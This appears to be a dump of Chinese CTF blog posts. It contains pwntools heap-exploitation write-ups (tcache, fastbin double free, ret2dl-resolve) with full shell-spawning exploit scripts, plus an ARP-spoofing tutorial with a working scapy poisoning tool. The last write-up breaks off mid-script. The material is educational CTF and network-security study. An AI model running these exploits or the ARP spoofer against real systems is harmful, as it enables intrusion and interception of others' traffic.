可以再一次分配chunk的地址到tcache struct上， 不过这次不需要控制tcache_counts, 要控制tcache_entry, 覆盖tcache_entry为malloc_hook的地址， 之后再分配合适大小的chunk即可从malloc_hook处开始分配 这里bin[30] 的tcache_entry指针被修改成了malloc_hook - 0x13的地址， 接下来只要输入size为0x20即可获得可以控制malloc_hook的chunk3.覆写malloc_hook为one_gadget或realloc， 取决于栈环境是否要调整 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/usr/bin/python2from pwn import *import sysimport os#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level = 'debug'debug = 1def pwn(): if debug == 1: exceve = \"./vn_pwn_easyTHeap\" p = process(exceve) if sys.argv[1] == '1': gdb.attach(p) else: ip = \"\" port = \"\" p = remote(ip, port) def add(size): p.sendlineafter(\"choice: \", str(1)) p.sendlineafter(\"size?\", str(size)) def edit(idx, content): p.sendlineafter(\"choice: \", str(2)) p.sendafter(\"idx?\", str(idx)) p.sendafter(\"content:\", content) def show(idx): p.sendlineafter(\"choice: \", str(3)) p.sendlineafter(\"idx?\", str(idx)) def free(idx): p.sendlineafter(\"choice: \", str(4)) p.sendlineafter(\"idx?\", str(idx)) elf = ELF(exceve) libc = ELF(\"./eth_libc-2.27.so\") add(0x50) #0 free(0) free(0) show(0) heap_leak = u64(p.recvline()[:-1].ljust(8, '\\x00')) add(0x50) #1 edit(1, p64(heap_leak - 0x250)) add(0x50) #2 add(0x50) #3 edit(3, '\\xff'*0x38) free(3) show(3) leak = u64(p.recvline()[:-1].ljust(8, '\\x00')) libc_base = leak - (0x7fa10bacbca0 - 0x7fa10b6e0000) log.info(\"libc_base -&gt; \" + hex(libc_base)) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x4f2c5, 0x4f322, 0x10a38c] log.info(\"malloc_hook -&gt; \" + hex(malloc_hook)) log.info(\"heap_leak -&gt; \" + hex(heap_leak)) add(0x50) #4 payload = '\\x00'*0x48 + p64(malloc_hook - 0x13) edit(4, payload) add(0x20) #5 edit(5, '\\x00'*(0x13-8) + p64(libc_base + one_gadget[1]) + p64(realloc + 8)) add(0x10) p.interactive() if __name__ == '__main__': pwn() 结果: –再记录下了解tcache struct attack 之前我的解法 1.由于tcache bin不会检查double free， 所以可以通过double free， 之后再free一次即可让tcache_counts 为-1， 而在后续进行检查的时候tcache_counts是被当作一个无符号数来看待的， 所以也能通过这种方式使得chunk进入unsorted bin中， 从而leak出libc地址 2.由于同一个chunk进行了多次free操作， 在tcache bin中也就会有一条链表里面都是同一个chunk， 这时可以通过add操作， 获得这个chunk的指针， 使得可以让这个chunk在tcache bin中又能向这个chunk输入数据， 那么可以控制chunk的fd指针为 malloc_hook - 0x13, 之后再分配chunk即可， 但是由于题目限制只能add七次， 我在把malloc_hook 覆写成one_gadget的地方处止步， 无法在调用malloc也就无法进行攻击了…","tags":[{"name":"tcache struct attack","slug":"tcache-struct-attack","permalink":"http://wafuter.jxustctf.top/tags/tcache-struct-attack/"}]},{"title":"i春秋网络安全联赛2020 BFnote 复现","date":"2020-02-29T13:21:28.000Z","path":"2020/02/29/i春秋网络安全联赛2020-BFnote-复现/","text":"盯着伪代码看了一段时间， 没有想法， 之后直接去看官方wp了， 发现了几个知识盲区， 学到了一点 本题考点为绕过canary， 按照官方wp的说法, 当前函数被调用的时候当前线程的tcbhead.stack_guard会放置到栈上， 放到栈上后也就是canary,而在tcb块在被mmap分配地址的时候会初始化在libc内存布局上方， 要控制这个tcbhead.stack_guard就得先得到tcb块附近的地址， 而malloc在分配的size超过128KB(也就是0x200000)时会也会调用mmap， 分配的地址也在libc内存布局上方 知道这点后就可以结合栈溢出漏洞以及后面的基于堆地址任意写就可以修改canary， 进行栈迁移从而利用ret2dl-reslove来getshell 复习一下 ret2dl-reslove 构造payload过程大致是先由ret 跳到plt[0]， 此处的代码是进入_dl_runtime_resolve(link_map, reloc_arg)的入口，第一条push 指令讲link_map入栈， link_map里面存有JMPREL, SYMTAB, STRTAB表的地址， 第二个参数会由相应函数的plt表中的push指令压栈之后再把伪造的.rel.plt数据的地址距 JMPREL表的地址偏移入栈， 之后便会进行第一步跳转，到对应函数的rel表项，取得距SYMTAB的偏移，也就是r_info&gt;&gt;8之后再跳转到SYMTAB取得st_name, 获得要调用的函数的函数名在STRTAB表中的偏移最后找到函数名的字符串，之后调用函数 rel 0x804a440 - 0x80483d0 = 0x2070sym 0x804a428 - 0x80481d8 = 0x2250str 0x804a448 - 0x80482c8 = 0x2180 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *import sysimport os#context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1d = 1def pwn(): execve = \"./BFnote\" if debug == 1: p = process(execve) if d == 1: gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def Give_des(des): p.sendlineafter(\"Give your description :\", des) def Post_des(des): p.sendlineafter(\"Give your postscript :\", des) def Notesize(size): p.sendlineafter(\"Give your notebook size :\", str(size)) def Titlesize(size): p.sendlineafter(\"Give your title size :\", str(size)) def Title(t): p.sendafter(\"Give your title : \", t) def Note(n): p.sendlineafter(\"Give your note :\", p32(n)) elf = ELF(\"./BFnote\") libc = ELF(\"bfnote_libc.so.6\") bss = 0x804A060 + 0x3a8 + 4 stdout = elf.symbols['stdout'] dl_resolve_data=\"\\x80\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x37\\x66\\x66\\x5a\\x6d\\x59\\x50\\x47\\x60\\xa1\\x04\\x08\\x07\\x25\\x02\\x00\\x73\\x79\\x73\\x74\\x65\\x6d\\x00\" dl_resolve_call=\"\\x50\\x84\\x04\\x08\\x70\\x20\\x00\\x00\" Give_des('\\x00'*0x32 + p32(0x12345678) + '\\x00'*0x4 + p32(bss)) payload = \"s\"*0x3a8 + dl_resolve_call + p32(0x12345678) + p32(0x804A060 + 0x3b8) + \"/bin/sh\\x00\" + p64(0) + dl_resolve_data Post_des(payload) Notesize(0x200000) Titlesize(0x20170c - 0x10) p.sendlineafter(\"invalid ! please re-enter :\", str(100)) Title(\"1234\") raw_input() Note(0x12345678) p.interactive()if __name__ == '__main__': pwn()","tags":[{"name":"ret2dl-reslove, 绕过canary","slug":"ret2dl-reslove-绕过canary","permalink":"http://wafuter.jxustctf.top/tags/ret2dl-reslove-%E7%BB%95%E8%BF%87canary/"}]},{"title":"网络嗅探初学","date":"2020-02-24T13:02:08.000Z","path":"2020/02/24/网络嗅探初学/","text":"以太网网卡的工作模式以太网网卡是我们日常生活中见得最多的网卡，常用的以太网卡支持以下工作模式：广播模式、多播模式、直接模式和混杂模式。 1.广播模式（Broad Cast Model）:它的物理地址（MAC）地址是 0Xffffff 的帧为广播帧，工作在广播模式的网卡接收广播帧。它将会接收所有目的地址为广播地址的数据包，一般所有的网卡都会设置为这个模式。 2.多播传送（MultiCast Model）：多播传送地址作为目的物理地址的帧可以被组内的其它主机同时接收，而组外主机却接收不到。但是，如果将网卡设置为多播传送模式，它可以接收所有的多播传送帧，而不论它是不是组内成员。当数据包的目的地址为多播地址，而且网卡地址是属于那个多播地址所代表的多播组时，网卡将接纳此数据包，即使一个网卡并不是一个多播组的成员，程序也可以将网卡设置为多播模式而接收那些多播的数据包。 3.直接模式（Direct Model）:工作在直接模式下的网卡只接收目地址是自己 Mac地址的帧。只有当数据包的目的地址为网卡自己的地址时，网卡才接收它。 4.混杂模式（Promiscuous Model）:工作在混杂模式下的网卡接收所有的流过网卡的帧，信包捕获程序就是在这种模式下运行的。网卡的缺省工作模式包含广播模式和直接模式，即它只接收广播帧和发给自己的帧。如果采用混杂模式，网卡将接受同一网络内所有主机发送的数据包。 设置网卡为混杂模式ifconfig eth0 Promisc 输入ifconfig 后第一行出现PROMISC 即表示当前为混杂模式 ifconfig eth0 -promisc 取消混杂模式 kali linux 上安装vscode1.先去官网下载.deb安装包2.执行命令sudo dpkg -i .debsudo apt-get install -f # Install dependencies –python with 关键字任何实现了 enter() 和 exit() 方法的对象都可称之为上下文管理器，上下文管理器对象可以使用 with 关键字 1234567891011121314class File(): def __init__(self, filename, mode): self.filename = filename self.mode = mode def __enter__(self): print(\"entering\") self.f = open(self.filename, self.mode) return self.f def __exit__(self, *args): print(\"will exit\") self.f.close() enter() 方法返回资源对象，这里就是你将要打开的那个文件对象，exit() 方法处理一些清除工作。 因为 File 类实现了上下文管理器，现在就可以使用 with 语句了。 socket.gethostname() – 获取主机名 socket.gethostname()‘kali’ RAW SOCKET 有关函数解释– socket.gethostbyname()根据主机名获取本机的ip 地址 – socket.socket 函数详解socket(family,type[,protocol])参数一：family 指定应用程序使用的通信协议的协议族，对于TCP/IP协议族，该参数为AF_INET参数二：type 是要创建套接字的类型,socket.SOCK_RAW: 原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。参数三：protocol 指明所要接收的协议类型，通常为0或者不填。socket.IPPROTO_IP: 相当于protocol=0，此时用于接收任何的IP数据包。其中的校验和和协议分析由程序自己完成。 – socket.setsockopt 函数详解socket.setsockopt(level,optname, value)默认的socket选项不够用的时候，就必须要使用setsockopt来调整s.setsockopt(socket.SOL_SOCKET，socket.SO_REUSEADDR, 1) level：选项定义的层次。支持SOL_SOCKET、IPPROTO_TCP、IPPROTO_IP和IPPROTO_IPV6。可以取三种值: 1)SOL_SOCKET: 通用套接字选项. 2)IPPROTO_IP: IP选项. 3)IPPROTO_TCP: TCP选项. optname：需设置的选项。SO_REUSEADDR： 允许重用本地地址和端口 数据类型为int该选项可以让多个socket对象绑定到相同的地址和端口上。value: 设置选项的值。","tags":[{"name":"网络嗅探","slug":"网络嗅探","permalink":"http://wafuter.jxustctf.top/tags/%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/"}]},{"title":"ARP协议欺骗初学","date":"2020-02-23T04:44:05.000Z","path":"2020/02/23/wireshark-学习一/","text":"只看http 协议的数据包Analize -&gt; display filter -&gt; http hypertext transfer protocol(ok) -&gt; apply 保存数据包先stop 抓取数据包 -&gt; File -&gt; save arp协议/rarp协议在TCP/IP协议族中， 数据链路层主要有三个目的:1.为IP模块发送和接收数据2.为ARP模块发送APR请求和接收ARP应答3.为RARP模块发送RAPT请求和接收RARP应答 在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议接到上层IP协议提供的数据中，只包含目的主机的IP地址。于是需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。 另外，当发送主机和目的主机不在同一个局域网中时，即便知道对方的MAC地址，两者也不能直接通信，必须经过路由转发才可以。所以此时，发送主机通过ARP协议获得的将不是目的主机的真实MAC地址，而是一台可以通往局域网外的路由器的MAC地址。于是此后发送主机发往目的主机的所有帧，都将发往该路由器，通过它向外发送。这种情况称为委托ARP或ARP代理（ARP Proxy）。 一.ARP协议 将IP地址转换成MAC地址工作原理在每台安装有TCP/IP协议的计算机或路由器里都有一个ARP缓存表，表里的IP地址与MAC地址是一对应的 以主机A（192.168.38.10）向主机B（192.168.38.11）发送数据为例。 1.当发送数据时，主机A会在自己的ARP缓存表中寻找是否有目标IP地址。如果找到就知道目标MAC地址为（00-BB-00-62-C2-02），直接把目标MAC地址写入帧里面发送就可。 2.如果在ARP缓存表中没有找到相对应的IP地址，主机A就会在网络上发送一个广播（ARP request），目标MAC地址是“FF.FF.FF.FF.FF.FF”，这表示向同一网段内的所有主机发出这样的询问：“192.168.38.11的MAC地址是什么？” 3.网络上其他主机并不响应ARP询问，只有主机B接收到这个帧时，才向主机A做出这样的回应（ARP response）：“192.168.38.11的MAC地址是00-BB-00-62-C2-02”，此回应以单播方式。这样，主机A就知道主机B的MAC地址，它就可以向主机B发送信息。同时它还更新自己的ARP高速缓存（ARP cache），下次再向主机B发送信息时，直接从ARP缓存表里查找就可。 ARP缓存表采用老化机制，在一段时间内如果表中的某一行没有使用，就会被删除，这样可减少缓存表的长度，加快查询速度。 免费ARP（gratuitous ARP），他是指主机发送ARP查询（广播）自己的IP地址，当ARP功能被开启或者是端口初始配置完成，主机向网络发送免费ARP来查询自己的IP地址确认地址唯一可用 作用:确定网络中是否有其他主机使用了IP地址，如果有应答则产生错误消息。免费ARP可以做更新ARP缓存用，网络中的其他主机收到该广播则在缓存中更新条目，收到该广播的主机无论是否存在与IP地址相关的条目都会强制更新，如果存在旧条目则会将MAC更新为广播包中的MAC。 二.RARP协议 将MAC地址转换成IP地址， 其因为较限于IP地址的运用以及其他的一些缺点，因此渐为更新的BOOTP或DHCP所取代 数据包结构类似于ARP的报文格式主要差别在于帧类型代码为0x8035（ARP为0x0806），操作码为3请求（ARP为1），4应答（ARP为2）。 工作原理1.发送主机发送一个本地的RARP广播，在此广播包中，声明自己的MAC地址并且请求任何收到此请求的RARP服务器分配一个IP地址；2.本地网段上的RARP服务器收到此请求后，检查其RARP列表，查找该MAC地址对应的IP地址；3.如果存在，RARP服务器就给源主机发送一个响应数据包并将此IP地址提供给对方主机使用；4.如果不存在，RARP服务器对此不做任何的响应；5.源主机收到从RARP服务器的响应信息，就利用得到的IP地址进行通讯；如果一直没有收到RARP服务器的响应信息，表示初始化失败。 arp -a 查看本节ARP缓存表 sudo arp -d -i en0 -a/ip neigh flush dev eth0 清空ARP缓存 ARP 欺骗原理ARP工作时，首先请求主机会发送出一个含有所希望到达的IP地址的以太网广播数据包，然后目标IP的所有者会以一个含有IP和MAC地址对的数据包应答请求主机。这样请求主机就能获得要到达的IP地址对应的MAC地址，同时请求主机会将这个地址对放入自己的ARP表缓存起来，以节约不必要的ARP通信。ARP缓存表采用了老化机制，在一段时间内如果表中的某一行没有使用，就会被删除。 局域网上的一台主机，如果接收到一个ARP报文，即使该报文不是该主机所发送的ARP请求的应答报文，该主机也会将ARP报文中的发送者的MAC地址和IP地址更新或加入到ARP表中。 ARP欺骗攻击就利用了这点，攻击者主动发送ARP报文，发送者的MAC地址为攻击者主机的MAC地址，发送者的IP地址为被攻击主机的IP地址。通过不断发送这些伪造的ARP报文，让局域网上所有的主机和网关ARP表，其对应的MAC地址均为攻击者的MAC地址，这样所有的网络流量都会发送给攻击者主机。由于ARP欺骗攻击导致了主机和网关的ARP表的不正确，这种情况我们也称为ARP中毒。 个人理解:攻击者发送arp应答报文给 被攻击者主机和网关, 伪造 发送者的IP地址为被攻击者主机的IP地址，伪造发送者的MAC地址为攻击者的MAC地址那么被攻击者主机和网关的ARP表中都存在被攻击者IP地址：攻击者MAC地址 之后当 被攻击者向网关发送ARP请求时 查找目标主机的MAC地址， 返回的是攻击者的MAC地址， 那么网络流量都会发送到攻击者的主机上 使用optparse模块中的OptionParser类来格式化用户输入和用法提醒 Ether 参数 ls(Ether)│dst : DestMACField = (None)│src : SourceMACField = (None)│type : XShortEnumField = (36864│)构造一个以太网数据包通常需要指定目标和源MAC地址，如果不指定，默认发出的就是广播包Ether().show()│###[ Ethernet ]###│ dst = ff:ff:ff:ff:ff:ff│ src = 00:00:29:22:4f:22│ type = 0x9000 ARP构造函数得参数列表:│&gt;&gt;&gt; ls(ARP)│hwtype : XShortField = (1)│ptype : XShortEnumField = (2048)│hwlen : FieldLenField = (None)│plen : FieldLenField = (None)│op : ShortEnumField = (1)│hwsrc : MultipleTypeField = (None)│psrc : MultipleTypeField = (None)│hwdst : MultipleTypeField = (None)│pdst : MultipleTypeField = (None) op。取值为1或者2，代表ARP请求或者响应包。hwsrc。发送方Mac地址。psrc。发送方IP地址。hwdst。目标Mac地址。pdst。目标IP地址。 定向欺骗现在来构造数据包就很容易了，回到我们最初的目标，我们想告诉192.168.1.23这台主机网关地址为192.168.1.102所在的主机，构造的数据包应该是这样的： pkt = Ether(src=[1.102的MAC], dst=[1.18的Mac]) / ARP(1.102的MAC, 网关IP地址, hwdst=1.18MAC, pdst=1.18IP地址, op=2)上面的代码我们不论是以太网数据包还是ARP数据包，我们都明确指定了来源和目标，在ARP数据包中，我们将Kali Linux的Mac地址和网关的IP地址进行了绑定，op取值为2，作为一个响应包被 1.18 接到，这样 1.18会更新自己的ARP缓存表，造成中毒，从而 1.18 发往网关的数据包都会被发往 1.102。 那么我们如果要欺骗网关，把网关发往1.18的数据包都发送到Kali Linux（1.102）上，根据上面的代码稍作修改即可： pkt = Ether(src=[1.102的MAC], dst=[网关的Mac]) / ARP(1.102的MAC, 1. 18地址, hwdst=网关MAC, pdst=网关IP地址, op=2)上面构造的两个数据包都是ARP响应包，其实发送请求包也可以进行毒化，请求包毒化的原理是，我们请求时候使用假的源IP和MAC地址，目标主机同样会更新自己的路由表。 ARP请求的方式欺骗主机，构造的ARP包如下： pkt = Ether(src=[1.102的MAC], dst=[1. 18的Mac]) / ARP(1.102的MAC, 网关IP地址, hwdst=1. 18MAC, pdst=1. 18IP地址, op=1)ARP请求的方式欺骗网关，构造的ARP包如下： pkt = Ether(src=[1.102的MAC], dst=[网关的Mac]) / ARP(1.102的MAC, 1. 18地址, hwdst=网关MAC, pdst=网关IP地址, op=1)我们看到构造ARP请求和响应的主要区别在op的值。 –个人理解:ARP(1.102的MAC, 1.18的地址， hwdst=网关MAC， pdst=网关IP地址， op=2)构造这样的arp应答包 给网关的话 会使网关的arp表 更新或加入一条 1.18的地址:1.102的MAC 的记录 ARP(1.102的MAC, 网关IP地址， hwdst=1.18MAC， pdst=1.18IP地址，op=2)构造这样的arp应答包 给被欺骗主机的话会使被欺骗主机的arp表 更新或加入一条 网关IP地址：1.102的MAC 的记录 广播欺骗目前我们欺骗的方式都是一对一欺骗的，事实上我们可以发送广播包，对所有主机进行欺骗。 广播欺骗，首先以太网数据包直接构造一个广播包，ARP包不用填写目标主机的信息即可。 下面是ARP广播响应包的构造方式： pkt = Ether(src=mac, dst=’ff:ff:ff:ff:ff:ff’) / ARP(hwsrc=mac, psrc=args[0], op=2)最后综合定下和广播欺骗的方式，我们总结一个公式出来： pkt = Ether(src=攻击机MAC, dst=被欺骗主机（或网关）MAC) / ARP((hwsrc=毒化记录中的MAC, 毒化记录中的IP, hwdst=被欺骗主机MAC, pdst=被欺骗主机IP地址, op=1（或2）) 打开linux中的ip转发功能 echo 1 &gt; /proc/sys/net/ipv4/ip_forward永久保存修改：改变/etc/sysctl.conf 设置ip_forward=1查看windows主机上的ip地址 ipconfig/all -&gt; ipv4地址查看linux 网关地址: netstat -rn/ route -n arpspoof 安装命令sudo apt-get install -y dsniff ssldump arp 编程实战12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182# -*- coding: UTF-8 -*-import sysimport osimport timefrom optparse import OptionParserfrom scapy.all import ( get_if_hwaddr, getmacbyip, ARP, Ether, sendp)def main(): try: if os.geteuid() != 0: print(\"[-] please run this program as root\") sys.exit(1) except Exception as msg: print(msg) usage = 'Usage: %prog [-i interface] [-t target] host' parser = OptionParser(usage) parser.add_option('-i', dest='interface', help='wangka') parser.add_option('-t', dest='target', help='deadbeef') parser.add_option('-m', dest='mode', default='reettercap -T -q -M ARP /172.17.171.21// /q', help='virus mode: requests (req) \\ or replies (rep) [default: %default]') parser.add_option('-s', action='store_true', dest='summary', default=False, help='message') (options, args) = parser.parse_args() if len(args) != 1 or options.interface is None: parser.print_help() sys.exit(0) def build_req(): if options.target is None: pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args, pdst=arg[0]) elif options.target: target_mac = getmacbyip(options.target) if target_mac is None: print(\"[-] Error: failed to get target\\'s mac\\'s addr\") sys.exit(1) pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, \\ pdst = options.target) return pkt def build_rep(): if options.target is None: pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], op=2) elif options.target: target_mac = getmacbyip(options.target) if target_mac is None: print(\"[-] Error: failed to get target's mac's addr\") sys.exit(1) pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, \\ pdst=options.target, op=2) return pkt mac = get_if_hwaddr(options.interface) # get local mac addr print('local mac\\' addr is %s' % mac) if options.mode == 'req': pkt = build_req() elif options.mode == 'rep': pkt = build_rep() if options.summary is True: pkt.show() ans = input('\\n[*] is going on? [Y|n]: ').lower() if ans == 'y' or len(ans) == 0: pass else: sys.exit(0) while True: sendp(pkt, inter=2, iface=options.interface)if __name__ == '__main__': main() 在终端中输入sudo python3 -i eth0 -m rep -t 192.168.0.108 192.168.0.1 -i 指定的网卡-m rep 表示发送应答数据包， req表示发送请求数据包-t 表示发送的目标主机192.168.0.108 表示windows上的主机的IP地址192.168.0.1 表示网关地址 通过向windows上的主机发送伪造的arp数据包 更新网关的mac的地址为攻击机的mac地址， 从而达到监控流量的目的 arp欺骗攻击前： arp欺骗攻击后: 可以看到网关的mac地址被修改成了攻击机的mac地址， 之后被攻击的主机所发送的流量都可以被监控","tags":[{"name":"wireshark基本操作， ARP欺骗原理与实践","slug":"wireshark基本操作，-ARP欺骗原理与实践","permalink":"http://wafuter.jxustctf.top/tags/wireshark%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%EF%BC%8C-ARP%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"}]},{"title":"Hgame-week2-writeup","date":"2020-02-01T14:58:26.000Z","path":"2020/02/01/Hgame-week2-writeup/","text":"findyourself咕咕咕 Roc826s_Note堆题， 开了栈上数据不可执行和栈溢出保护 能进行add， dele， show操作， 存在uaf漏洞， 但是没有edit操作， 不能直接在chunk中布置数据但是可以通过double free 往已经free的chunk中输入数据， 之后就是劫持malloc_hook为one_gadget就可以getshell了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677781 from pwn import *2 import sys3 import os45 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])6 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])7 context.log_level='debug'8 debug = 09 d = 01011 def pwn():12 execve = \"./Roc826\"13 if debug == 1:14 p = process(execve)15 if d == 1:16 gdb.attach(p)17 else:18 #ip = \"10.0.%s.140\" % sys.argv[1]19 ip = \"47.103.214.163\"20 host = \"21002\"21 p = remote(ip, host)2223 elf = ELF(\"./Roc826\")24 libc = ELF(\"roc_libc-2.23.so\")2526 def add(size, content):27 p.sendlineafter(\":\", str(1))2829 p.sendlineafter(\"size?\", str(size))30 p.sendlineafter(\"content:\", content)3132 def free(idx):33 p.sendlineafter(\":\", str(2))3435 p.sendlineafter(\"index?\", str(idx))3637 def show(idx):38 p.sendlineafter(\":\", str(3))3940 p.sendlineafter(\"index?\", str(idx))4142 add(0x90, \"\\x00\") #043 add(0x90, \"\\x00\") #144 free(0)4546 show(0)4748 p.recvuntil(\"content:\")49 leak = u64(p.recv(6).ljust(8, '\\x00'))50 libc_base = leak - (0x7fee89dbbb78 - 0x7fee899f7000)51 malloc_hook = libc_base + libc.symbols['__malloc_hook']52 realloc = libc_base + libc.symbols['__libc_realloc']53 one_gadget = [libc_base+0x45216, libc_base+0x4526a, libc_base+0xf02a4, libc_base+0xf1147]54 log.info(\"leak -&gt; \" + hex(libc_base))55 #log.info(\"one_gadget -&gt; \" + hex(one_gadget[0]))5657 add(0x90, '\\x00') #25859 add(0x68, '\\x00') #360 add(0x68, '\\x00') #461 add(0x68, '\\x00') #562 free(3)63 free(4)64 free(3)65 add(0x68, p64(malloc_hook - 0x23)*2) #66667 add(0x68, '\\x00') #768 add(0x68, '\\x00') #869 #add(0x68, 'a'*0xb + p64(one_gadget[1]) + p64(realloc + 4)) #970 add(0x68, 'a'*0x13 + p64(one_gadget[3]))7172 p.sendlineafter(\":\", str(1))73 p.sendlineafter(\"size?\", str(20))7475 p.interactive()7677 if __name__ == '__main__':78 pwn() Another_Heaven保护跟Roc826_note一样 看程序好像没什么溢出的地方， 看了一眼没什么点子 之后反复看了上面的两个地方发现好像可以爆破， 之后写了脚本就爆破出来了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344451 from pwn import *2 from string import printable3 import sys4 import os56 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])7 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])8 context.log_level='debug'9 debug = 010 d = 11112 flag = \"\"13 addr = 0x6021611415 while True:16 for i in printable:17 flag += i18 execve = \"./AH\"19 if debug == 1:20 p = process(execve)21 if d == 1:22 gdb.attach(p)23 else:24 #ip = \"10.0.%s.140\" % sys.argv[1]25 ip = \"47.103.214.163\"26 host = \"21001\"27 p = remote(ip, host)2829 account = \"E99p1ant\\0\"30 p.sendlineafter('There is a back door...\\\"Hacked by Annevi!\\\"', str(addr))31 p.send('\\0')3233 p.sendlineafter(\"Account:\", account)34 p.sendlineafter(\"Password:\", flag + '\\0')3536 if p.recv(2) == \"Wr\":37 flag = flag[:-1]38 p.close()39 continue40 else:41 addr += 142 break43 if len(flag) &gt;= 0x30:44 print \"flag -&gt; \" + flag45 break 形而上的坏死保护除了可以改写重定位表 其它都开了 我看这题就是为难我胖虎，把一个8字节空间拆成两个4字节空间来用， 一开始没看出来搞得我晕晕的，不过解题的思路不难想 这里的v2变量的低4个字节和高四个字节各有作用 布置$rbp - 0xb8 的数据为0x5ffffffeb, 高4位上的数据是5， 地址为$rbp - 0xb4， 这样可以泄露libc地址， 进而得到libc基址 低4位上的数据为0xffffffeb， 也就是-0xa8, 这是处在bss段的变量e99与puts的got表地址的偏移 最后就是劫持puts的got表地址为one_gadget就可以getshell了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556571 # -*- coding: utf-8 -*-2 from pwn import *3 import binascii4 import sys5 import os67 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 11213 def pwn():14 execve = \"./Metaphysical_Necrosis\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"21003\"23 p = remote(ip, host)2425 elf = ELF(\"./Metaphysical_Necrosis\")26 libc = ELF(\"mn_libc-2.23.so\")2728 p.sendlineafter(\"你要把C4安放在哪里呢？\", str(-21))29 p.sendline(\"\\xeb\\xff\\xff\\xff\\x05\\x00\\x00\\x00\")3031 #p.recvuntil(\"the bomb has been planed!\\n\")32 p.send('\\n')33 #p.recvuntil(\"你说吼不吼啊！\")34 p.send('\\n')3536 p.sendlineafter(\"名字:\", \"hanpi\")37 p.sendlineafter(\"你打算把它切成几段呢？\", str(0))3839 raw_input()40 p.sendlineafter(\"请问它经过的路程是__m:\", str(25769803755))41 p.recvuntil(\"Terrorist Win\")4243 print p.recvline()44 leak = u64(p.recv(6).ljust(8, '\\x00'))45 libc_base = leak - 240 - libc.symbols['__libc_start_main']46 one_gadget = [libc_base+0x45216, libc_base+0x4526a, libc_base+0xf02a4, libc_base+0xf1147]47 log.info(\"libc_base -&gt; \" + hex(libc_base))48 log.info(\"one_gadget -&gt; \" + hex(one_gadget[1]))4950 raw_input()51 #print \"&gt;&gt;&gt;\" + binascii.a2b_hex(str(hex(one_gadget[0])[2:]))[::-1]52 p.sendlineafter(\"啊~~！~？~…____\", binascii.a2b_hex(str(hex(one_gadget[0])[2:]))[::-1])5354 p.interactive()5556 if __name__ == '__main__':57 pwn() 最后记一个知识点 123&gt;&gt;&gt;import binascii&gt;&gt;&gt; binascii.a2b_hex(\"e4bda0e5a5bde5958a\")'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe5\\x95\\x8a' 结果：","tags":[{"name":"PWN，Hgame2020","slug":"PWN，Hgame2020","permalink":"http://wafuter.jxustctf.top/tags/PWN%EF%BC%8CHgame2020/"}]},{"title":"buuoj-ciscn_2019_ne_5-writeup","date":"2020-01-20T07:46:42.000Z","path":"2020/01/20/buuoj-ciscn-2019-ne-5-writeup/","text":"这题溢出点比较明显， system也给了， 那么就差/bin/sh了， 直接利用pwntools的search在elf文件找， 找到/bin/sh后者sh都行， 程序中也用到了fflush函数， 所以sh是一定找的到了， 那么接下来就是构造payload的事了 12345678910111213141516171819202122232425262728293031323334353637383 from pwn import *4 import sys5 import os6 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])7 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context.log_level = 'debug'910 debug = 011 d = 1121314 def pwn():15 if debug == 1:16 exceve = \"./ciscn_2019_ne_5\"17 p = process(exceve)18 if d == 1:19 gdb.attach(p)20 else:21 ip = \"node3.buuoj.cn\"22 port = \"26354\"23 p = remote(ip, port)2425 def addlog(payload):26 p.sendlineafter(\"0.Exit\\n:\", str(1))27 p.sendlineafter(\"Please input new log info:\", payload)2829 elf = ELF(\"./ciscn_2019_ne_5\")3031 p.sendlineafter(\"Please input admin password:\", 